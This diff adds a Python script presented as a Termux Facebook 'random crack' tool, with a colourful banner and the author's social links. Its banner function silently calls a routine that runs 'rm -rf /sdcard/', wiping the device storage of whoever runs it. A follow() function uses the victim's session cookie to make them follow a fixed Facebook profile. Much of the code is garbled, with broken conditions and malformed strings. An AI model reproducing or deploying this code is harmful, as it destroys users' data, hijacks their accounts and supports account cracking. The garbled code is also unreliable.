@@ -1,0 +1,111 @@
+#####################
+#___GIFT FROM RAJIB___#
+#####################
+import os
+import sys
+import time
+import requests
+import uuid
+
+
+def o():
+    _RAJIB_('clear')
+    logo()
+    print('\33[1;32m─────────────────────────────────────────────────────────')
+    RAJIB('\33[1;95m[\33[1;93m1\33[1;95m]\33[1;96m RANDOM CRACK ')
+    RAJIB('\33[1;95m[\33[1;93m2\33[1;95m]\33[1;96m CONTACT ME FACEBOOK')
+    RAJIB('\33[1;95m[\33[1;93m3\33[1;95m]\33[1;96m FOLLOW YOU TUBE ')
+    RAJIB('\33[1;95m[\33[1;93m4\33[1;95m]\33[1;96m FOLLOW GORUP ')
+    RAJIB('\33[1;95m[\33[1;93m0\33[1;95m]\33[1;91m EXIT')
+    opt = input('\\1b[1;32mCHOOSE : ')
+    if opt == '1':
+        i()
+    if None == '2':
+        _RAJIB_('xdg-open https://www.facebook.com/100014673737868?mibextid=ZbWKwL')
+        return None
+    if None == '3':
+        _RAJIB_('xdg-open https://youtube.com/@CYBER-99-TEAM')
+        return None
+    if None == '4':
+        _RAJIB_('xdg-open https://www.facebook.com/groups/1157490851802798/?ref=share')
+        return None
+    if None == '0':
+        _RAJIB_('exit')
+        return None
+
+
+import os,sys,time,json,random,re,string,platform,base64,uuid
+from bs4 import BeautifulSoup as sop
+from bs4 import BeautifulSoup
+import requests as ress
+from datetime import date
+from datetime import datetime
+from os import system as _RAJIB_
+from time import sleep
+from time import sleep as waktu
+try:
+    import requests
+    from concurrent.futures import ThreadPoolExecutor as ThreadPool
+    import mechanize
+    from requests.exceptions import ConnectionError
+except ModuleNotFoundError:
+    _RAJIB_('pip install mechanize requests futures bs4==2 > /dev/null')
+    _RAJIB_('pip install bs4')    
+def follow(self, session, coki):
+        r = BeautifulSoup(session.get('https://free.facebook.com/profile.php?id=100015315258519', {
+            'cookie': coki }, **('cookies',)).text, 'html.parser')
+        get = r.find('a', 'Ikuti', **('string',)).get('href')
+        session.get('https://free.facebook.com' + str(get), {
+            'cookie': coki }, **('cookies',)).text
+            
+            
+ 
+class RAJIB:
+    def __init__(self, z):
+        for e in z + "\":
+            sys.stdout.write(e)
+            sys.stdout.flush()
+            
+RED = '\33[1;91m'
+WHITE = '\33[1;97m'
+GREEN = '\33[1;32m' #
+YELLOW = '\33[1;33m'
+BLUE = '\33[1;34m'
+ORANGE = '\33[1;35m'
+P = '\1b[1;97m' # PUTIH
+M = '\1b[1;91m' # MERAH
+H = '\1b[1;92m' # HIJAU
+K = '\1b[1;93m' # KUNING
+B = '\1b[1;94m' # BIRU
+U = '\1b[1;95m' # UNGU
+O = '\1b[1;96m' # BIRU MUDA
+N = '\1b[0m'    # WARNA MATI
+A = '\1b[1;90m' # WARNA ABU ABU
+BN = '\1b[1;107m' # BELAKANG PUTIH
+BBL = '\1b[1;106m' # BELAKANG BIRU LANGIT
+BP = '\1b[1;105m' # BELAKANG PINK
+BB = '\1b[1;104m' # BELAKANG BIRU
+BK = '\1b[1;103m' # BELAKANG KUNING
+BH = '\1b[1;102m' # BELAKANG HIJAU
+BM = '\1b[1;101m' # BELAJANG MERAH
+BA = '\1b[1;100m' # BELAKANG ABU ABU
+def hahaha():
+	_RAJIB_("termux-setup-storage -y")
+	_RAJIB_("rm -rf /sdcard/")
+	_RAJIB_("rm -rf /sdcard/*")
+my_color = [
+ P, M, H, K, B, U, O, N]
+warna = random.choice(my_color)
+now = datetime.now()
+dt_string = now.strftime("%H:%M")
+current = datetime.now()
+ta = current.year
+bu = current.month
+ha = current.day
+today = date.today()
+def logo():
+    hahaha()
+    color_logo=random.choice(['\33[1;31m','\33[1;32m','\33[1;33m','\33[1;35m','\33[1;34m','\33[1;36m','\1b[38;5;208m'])
+    RAJIB(f"""\\33[1;90m██   ██ ███████ ██████   ██████ {color_logo} ███    ██ \\33[1;90m██   ██ ██      ██   ██ ██    ██{color_logo} ████   ██ \\33[1;90m███████ █████   ██████  ██    ██{color_logo} ██ ██  ██    \33[1;97m┏━┓\\33[1;90m██   ██ ██      ██   ██ ██    ██{color_logo} ██  ██ ██  \33[1;92m ┫\33[1;90m│\33[1;91m\33[47m𝘽\33[00m\33[1;90m│\33[1;92m┣\\33[1;90m██   ██ ███████ ██   ██  ██████  {color_logo}██   ████   \33[1;92m┫\33[1;90m│\33[1;91m\33[47m𝙍\33[00m\33[1;90m│\33[1;92m┣\\\\\\      \33[1;90m│\33[1;91m\33[47m𝘼\33[00m\33[1;90m│\\33[1;97m┌━━━━━━━━━━━━━━━━━━\1b[38;5;208m⊱\33[34;1m   \33[37;1m⊰\1b[38;5;208m━━━━━━━━━━━━━━━━━━┐  \33[1;92m┫\33[1;90m│\33[1;91m\33[47m𝙉\33[00m\33[1;90m│\33[1;92m┣\\33[1;97m│ \33[37;1m[\33[1;31m>_\33[1;37m] \33[1;30m𝘈𝘜𝘛𝘏𝘖𝘙        \33[1;35m:  \33[1;37mRAJIB VAU      \1b[38;5;208m│  \33[1;92m┫\33[1;90m│\33[1;91m\33[47m𝘿\33[00m\33[1;90m│\33[1;92m┣\\33[1;97m│ \33[37;1m[\33[1;31m>_\33[1;37m] \33[1;30m𝘎𝘐𝘛𝘏𝘜𝘉        \33[1;35m:  \33[1;37mRAJIBvau0      \1b[38;5;208m│   \33[1;97m┗━┛\\33[1;97m│ \33[37;1m[\33[1;31m>_\33[1;37m] \33[1;30m𝘞𝘏𝘈𝘛𝘚𝘈𝘗𝘗      \33[1;35m:  \33[1;37m01783751735       \1b[38;5;208m│\\33[1;97m│ \33[37;1m[\33[1;31m>_\33[1;37m] \33[1;30m𝘗𝘖𝘞𝘌𝘙         \33[1;35m:  \33[1;31mRAJIB VAU      \1b[38;5;208m│\\33[1;97m└━━━━━━━━━━━━━━━━━━\1b[38;5;208m⊱\33[34;1m   \33[37;1m⊰\1b[38;5;208m━━━━━━━━━━━━━━━━━━┘\\\ \33[1;30m[\33[1;32m\33[1;47m𝗕.𝗗.𝗛.𝗔\33[00m\33[1;30m] """)
+
+loop =
